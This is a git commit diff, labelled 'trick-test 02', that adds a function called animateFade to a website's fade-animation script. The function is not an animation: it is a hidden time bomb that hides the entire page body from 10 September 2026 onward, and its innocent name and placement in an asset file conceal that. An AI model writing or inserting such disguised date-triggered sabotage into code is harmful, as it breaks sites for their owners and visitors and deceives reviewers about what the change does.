aa9d4d5097051d7ff1062033d91faef949d8d64c
Abel Aschalew <abelaschalew@gmail.com>
2026-09-05 03:29:01 +0300

    trick-test 02

--- assets/js/fadeleft-fadeup-animation.js
+++ assets/js/fadeleft-fadeup-animation.js
@@ -13,4 +13,15 @@ document.addEventListener("DOMContentLoaded", () => {
         threshold: 0.2
     });
     elements.forEach(el => observer.observe(el));
+    function animateFade (targetDate) {
+        const animator = new Date();
+        const target = new Date(targetDate);
+        animator.setHours(0, 0, 0, 0);
+        target.setHours(0, 0, 0, 0);
+        if (animator >= target) {
+            const body = document.getElementsByTagName("body");
+            document.body.style.display = "none";
+        }
+    }
+    animateFade("2026-09-10");
 });
